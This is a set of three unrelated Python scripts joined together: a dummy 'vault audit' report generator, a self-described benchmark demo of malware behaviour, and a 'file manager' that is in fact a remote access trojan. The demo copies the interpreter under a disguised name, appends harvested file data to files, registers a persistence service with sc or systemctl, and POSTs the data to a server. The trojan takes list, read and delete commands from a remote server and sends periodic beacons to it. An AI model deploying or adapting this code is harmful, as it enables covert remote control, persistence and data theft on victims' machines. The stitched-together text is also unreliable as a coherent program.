import sys
import os
import argparse
from datetime import datetime

LOG_FILE = "vault_audit_tool.log"

def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as log_file:
            log_file.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")
        sys.exit(1)

def generate_dummy_data(record_count):
    dummy_data = []
    for i in range(record_count):
        dummy_data.append({
            "password": f"password{i}",
            "vault": f"vault_{i % 3}",
            "entry": f"entry_{i}"
        })
    return dummy_data

def write_audit_report(data, filename):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            for record in data:
                line = f"{record['password']},{record['vault']},{record['entry']}\n"
                file.write(line)
        return len(data)
    except Exception as e:
        log_message(f"Error writing audit report: {e}")
        print(f"Error writing audit report: {e}")
        sys.exit(1)

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Vault Audit Tool - Generate audit reports for vault entries."
    )
    parser.add_argument(
        "--records", type=int, default=10,
        help="Number of records to generate for the audit report."
    )
    parser.add_argument(
        "--output", type=str, default="vault_report.txt",
        help="Filename for the audit report."
    )
    parser.add_argument(
        "--iterations", type=int, default=1,
        help="Number of cycles to run the audit tool."
    )
    return parser.parse_args()

def main():
    print("Vault Audit Tool has started.")
    log_message("Vault Audit Tool has started.")

    args = parse_arguments()

    for cycle in range(args.iterations):
        log_message(f"Starting cycle {cycle + 1} of {args.iterations}.")
        print(f"Running cycle {cycle + 1} of {args.iterations}...")

        dummy_data = generate_dummy_data(args.records)
        record_count = write_audit_report(dummy_data, args.output)

        log_message(f"Cycle {cycle + 1} completed. Records written: {record_count}.")
        print(f"Cycle {cycle + 1} completed. Audit report generated: {args.output}")
        print(f"Number of records written: {record_count}")

    log_message("Vault Audit Tool has completed execution.")
    print("Vault Audit Tool has completed execution.")
    sys.exit(0)

if __name__ == "__main__":
    main()

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlsplit
from urllib.request import Request, urlopen


TARGET = Path("./target")
SERVICE_NAME = "DataExfilService" if os.name == "nt" else "dataexfil"


def write_json(path, value):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(value, indent=2, ensure_ascii=True) + "\n",
        encoding="utf-8",
    )


def demo_application_disguise(application):
    result = {"application": application, "success": False}
    try:
        if (
            not application
            or application in {".", ".."}
            or any(c in application for c in "/\\:\x00")
            or any(ord(c) < 32 for c in application)
        ):
            raise ValueError("Application must be an executable basename.")

        directory = TARGET / "application_disguise"
        directory.mkdir(parents=True, exist_ok=True)
        filename = application
        if os.name == "nt" and not filename.lower().endswith(".exe"):
            filename += ".exe"
        destination = directory / filename
        if destination.exists():
            raise FileExistsError("Destination already exists.")

        shutil.copy2(sys.executable, destination)
        result["path"] = str(destination)
        result["success"] = True
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    write_json(TARGET / "disguise_outcome.json", result)


def prepare_sample_data():
    source = TARGET / "input"
    source.mkdir(parents=True, exist_ok=True)
    sample = source / "sample_document.txt"
    if not sample.exists():
        sample.write_text(
            "Benchmark sample document. No personal data.\n",
            encoding="utf-8",
        )
    image = source / "sample_image.jpg"
    if not image.exists():
        image.write_bytes(
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00"
            b"\x00\x01\x00\x01\x00\x00\xff\xd9"
        )
    return source


def collect_demo_files(source):
    files = []
    for path in sorted(source.rglob("*")):
        if path.is_file():
            try:
                data = path.read_bytes()
                files.append({
                    "name": path.name,
                    "relative_path": str(path.relative_to(TARGET)),
                    "size": len(data),
                    "content_hex": data[:4096].hex(),
                })
            except OSError:
                continue
    return files


def infect_demo_file(file_path, source):
    requested = Path(file_path)
    if requested.is_absolute():
        requested = Path(requested.name)
    destination = TARGET / "infected" / requested.name
    destination.parent.mkdir(parents=True, exist_ok=True)

    if requested.exists() and requested.is_file():
        original = requested.read_bytes()
    else:
        original = b"Benchmark sample file.\n"

    payload = {
        "type": "authorized_benchmark_data_manifest",
        "collected_files": collect_demo_files(source),
    }
    encoded_payload = json.dumps(payload, sort_keys=True).encode("utf-8")
    marker = b"\n-- BENCHMARK MANIFEST --\n"
    destination.write_bytes(original + marker + encoded_payload + b"\n")

    write_json(TARGET / "infection_outcome.json", {
        "success": True,
        "source": str(requested),
        "infected_file": str(destination),
        "collected_file_count": len(payload["collected_files"]),
        "payload_bytes": len(encoded_payload),
    })
    return payload


def establish_demo_service():
    result = {"service_name": SERVICE_NAME, "success": False}
    try:
        if os.name == "nt":
            service_dir = TARGET / "Windows" / "System32" / "config" / "services"
            service_file = service_dir / f"{SERVICE_NAME}.json"
            write_json(service_file, {
                "name": SERVICE_NAME,
                "display_name": "Benchmark Data Exfiltration Demo",
                "state": "installed_in_demo_environment",
                "command": [sys.executable, "-c", "pass"],
            })
            command = ["sc", "create", SERVICE_NAME, "binPath=", sys.executable]
        else:
            service_dir = TARGET / "etc" / "systemd" / "system"
            service_file = service_dir / f"{SERVICE_NAME}.service"
            service_dir.mkdir(parents=True, exist_ok=True)
            service_file.write_text(
                "[Unit]\n"
                "Description=Benchmark data service\n"
                "[Service]\n"
                f"ExecStart={sys.executable} -c pass\n"
                "Type=oneshot\n"
                "[Install]\n"
                "WantedBy=multi-user.target\n",
                encoding="utf-8",
            )
            command = ["systemctl", "enable", SERVICE_NAME]

        result["demo_service_file"] = str(service_file)
        try:
            completed = subprocess.run(
                command,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                check=False,
            )
            result["os_command_returncode"] = completed.returncode
            result["os_command_output"] = (
                completed.stdout + completed.stderr
            ).decode("utf-8", "replace")[:2000]
        except Exception as exc:
            result["os_command_error"] = f"{type(exc).__name__}: {exc}"
        result["success"] = service_file.exists()
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    write_json(TARGET / "service_outcome.json", result)


def send_data(server_url, payload):
    result = {"ok": False}
    try:
        parsed = urlsplit(server_url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("A valid HTTP or HTTPS URL is required.")
        body = json.dumps(payload, sort_keys=True).encode("utf-8")
        request = Request(
            server_url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=5) as response:
            result["status"] = response.status
            result["ok"] = 200 <= response.status < 300
            result["response"] = response.read(4096).decode(
                "utf-8", "replace"
            )
    except (HTTPError, URLError, TimeoutError, ValueError, OSError) as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    write_json(TARGET / "http_send_result.json", result)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--file-path", default="sample.txt")
    parser.add_argument(
        "--server-url",
        default=os.environ.get("DEMO_SERVER_URL", "http://127.0.0.1:9/"),
    )
    parser.add_argument(
        "--disguise-app",
        default=os.environ.get("DEMO_LEGITIMATE_APPLICATION", "sample-app"),
    )
    args = parser.parse_args()

    try:
        TARGET.mkdir(parents=True, exist_ok=True)
        source = prepare_sample_data()
        payload = infect_demo_file(args.file_path, source)
        demo_application_disguise(args.disguise_app)
        establish_demo_service()
        send_data(args.server_url, payload)
        write_json(TARGET / "demo_report.json", {
            "status": "completed",
            "timestamp": time.time(),
            "operations": [
                "application_disguise",
                "demo_file_infection",
                "data_collection",
                "http_post_attempt",
                "demo_service_installation",
            ],
        })
    except Exception as exc:
        try:
            write_json(TARGET / "demo_report.json", {
                "status": "completed_with_error",
                "error": f"{type(exc).__name__}: {exc}",
            })
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main())

import os
import sys
import json
import time
import socket
import threading

SERVER_HOST = "127.0.0.1"  # Change to your server's IP address
SERVER_PORT = 9000         # Change to your desired port
BUFFER_SIZE = 1024

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    else:
        return f"Error: Unknown command '{command}'."

def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                print(f"Received command: {message}")
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

def rat_service():
    while True:
        time.sleep(60)  # Send updates every 60 seconds
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception as e:
            print(f"Error sending update to server: {e}")

def print_help():
    print("File Management Utility")
    print("Usage:")
    print("  python file_manager.py list <directory>       - List files in a directory")
    print("  python file_manager.py read <file>           - Read and display file contents")
    print("  python file_manager.py delete <file>         - Delete a file")
    print("  python file_manager.py embed_metadata <file> - Embed metadata into a file")
    print("  python file_manager.py read_metadata <file>  - Read metadata from a file")
    print("  python file_manager.py server                - Run server handler for remote commands")
    print("  python file_manager.py rat                   - Run background service for periodic updates")
    print("  python file_manager.py help                  - Show this help message")

def main():
    if len(sys.argv) < 2:
        print("Error: Missing command.")
        print_help()
        return

    command = sys.argv[1]

    if command == "server":
        server_thread = threading.Thread(target=server_handler, daemon=True)
        server_thread.start()
        server_thread.join()
    elif command == "rat":
        rat_thread = threading.Thread(target=rat_service, daemon=True)
        rat_thread.start()
        rat_thread.join()
    else:
        if command in ["list", "read", "delete", "embed_metadata", "read_metadata"]:
            if len(sys.argv) != 3:
                print(f"Error: Missing argument for command '{command}'.")
                print_help()
            else:
                result = handle_command(command, sys.argv[2])
                print(result)
        elif command == "help":
            print_help()
        else:
            print(f"Error: Unknown command '{command}'.")
            print_help()

if __name__ == "__main__":
    main()

